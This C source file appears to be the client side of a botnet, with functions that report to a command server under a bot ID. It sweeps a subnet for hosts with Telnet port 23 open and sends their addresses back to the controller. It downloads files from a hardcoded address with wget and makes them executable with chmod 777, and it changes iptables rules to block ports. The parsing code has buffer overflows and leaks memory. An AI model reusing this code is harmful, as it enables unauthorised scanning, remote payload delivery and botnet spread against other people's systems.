#include "connection.h"
#include "reporter.h"
#include <arpa/inet.h>
#include <stdio.h>
#include<stdlib.h>
#include <time.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <errno.h>

int create_connection(int port, char *ip){
   // printf("Trying to connect to %s:%d.\n", ip, port);
    errno = 0;
    // sockfd is the client socket file discriptor
    //connfd is the connection file derscriptor;
    int sockfd, connfd;
    struct sockaddr_in servaddr;
    memset (&servaddr, 0, sizeof(servaddr));
    // we creat a socketthat connect to the internet(AF_INET), 
    //using the TCP as a type (Sock_stream), 0 is for the IP protocol (present in the header of a packet) 
    sockfd = socket (AF_INET, SOCK_STREAM, 0);
    // if there is an error in the creation of the socket terminate
    if (sockfd == -1) {
        printf("Error in the creation of the socket terminate !!\n");
        return -1;
    }
    
 // put the information of the serveraddress domain, ip, and port
    bzero(&servaddr,sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr= inet_addr(ip);
    servaddr.sin_port = htons(port);

 //connect the client socket to server socket

    if(connect(sockfd, (struct sockaddr*)&servaddr, sizeof (struct sockaddr_in))!=0){
        close(sockfd);
        printf("[Connection Error]:\t");
        printf("%s\n", strerror(errno));
        return -1;
        }
        return sockfd;

}

bool closePort(int port){
    int t = 0;
    char* cmd;
    cmd = (char *) malloc(sizeof(char) * 50);
    sprintf(cmd, "iptables -I INPUT -p tcp --dport %d %s\n", port, "-j REJECT");
    t = system(cmd);
    free(cmd);
    if (t == -1)
    return false;
    else
    return true;
}


bool update(char* filename){
    int t = 0;
    char* cmd;
    cmd = (char *) malloc(sizeof(char) * 50);
    sprintf(cmd, "wget 172.18.18.18:8081/code/%s ", filename);
    t = system(cmd);
    sprintf(cmd, "chmod 777 %s ", filename);
    t = system(cmd);
    free(cmd);
    if (t == -1)
    return false;
    else
    return true;
}



bool scan_sub(char* ip, int sub, int svr_sock, int BOT_ID){
    int x, y;
    uint8_t o1, o2, o3, o4;

    int counter = 0;
    int j = 0;
    int temp_sockfd;
    char* part1 = (char*) malloc(3*sizeof(char));
    char* part2 = (char*) malloc(3*sizeof(char));
    char* part3 = (char*) malloc(3*sizeof(char));
    char* part4 = (char*) malloc(3*sizeof(char));
    char* address = (char*) malloc(15*sizeof(char));
    char* mes = (char*) malloc(30*sizeof(char));

    memset(mes, 0, 30);
    memset(part1, 0, 3);
    memset(part2, 0, 3);
    memset(part3, 0, 3);
    memset(part4, 0, 3);


        for(int i = 0 ; i < 15 ; i++){


        if (counter == 0){
            if (ip[i] == '.'){
               counter ++;
               part1[j] = '\0';
                j = 0;
            }

            else{
                part1[j] = ip[i];
                j++;   
            } 
        }
       else  if (counter == 1){
            if (ip[i] == '.'){
                 counter ++;
                 part2[j] = '\0';
                 j = 0;
            }
            else{
                part2[j] = ip[i];
                j++; 
            } 
        }
       else  if (counter == 2){
            if (ip[i] == '.'){
                counter ++;
                part3[j] = '\0';
                j = 0;
            }
            else{
                part3[j] = ip[i];
                j++; 
            } 
                
        }
        else if (counter == 3){
            if (j < 3){
                part4[j] = ip[i];
                j++; 
            } 
            else 
                  part4[j] = '\0';  
        }
    }
    
    o1 = (uint8_t) (atoi(part1));
    o2 = (uint8_t) (atoi(part2));
    o3 = (uint8_t) (atoi(part3));
    o4 = (uint8_t) (atoi(part4));

    if (sub > 32)
        return false;
    else if(sub < 15)
        return false;
    else if (sub > 15 && sub < 23){
         x = 255;
        if(sub ==16)
            y = 255;
        if(sub ==17)
            y = 127;
        if(sub ==18)
            y = 63;
        if(sub ==19)
            y = 31;
        if(sub ==20)
            y = 15;
        if(sub ==21)
            y = 7;
        if(sub ==22)
            y = 3;
        if(sub ==23)
            y = 1;
            }
    else if( sub > 23 && sub < 33){
        y = 0;
        if (sub == 24)
            x = 255;
        else if( sub == 25)
            x = 127;
        else if( sub == 26)
            x = 63;
        else if( sub == 27)
            x = 31;
        else if( sub == 28)
            x = 15;
        else if( sub == 29)
            x = 7;
        else if( sub == 30)
            x = 3;
        else if ( sub == 31)
            x = 1;
        else if (sub == 32)
            x = 0;

    }    
    

        for(int j = 0 ; j <= y ; j ++ ){

            for (int i = 0 ; i <= x ; i++){
                memset(address, 0, 15);
                sprintf(address, "%u.%u.%u.%u", o1,o2,o3,o4);
                temp_sockfd = create_connection(23, address);
                if ( temp_sockfd > 0){
                    memset(mes, 0, 15);
                    sprintf(mes, "OPEN %s-\0", address);
                    send_msg(svr_sock, mes, BOT_ID);
                    close(temp_sockfd);
                }
                    
                o4 ++;
            
             }
             o3 ++;
        }
    
    // free(part1);
    // free(part2);
    // free(part3);
    // free(part4);
    // free(address);
    // free(mes);
    return 1;
    
}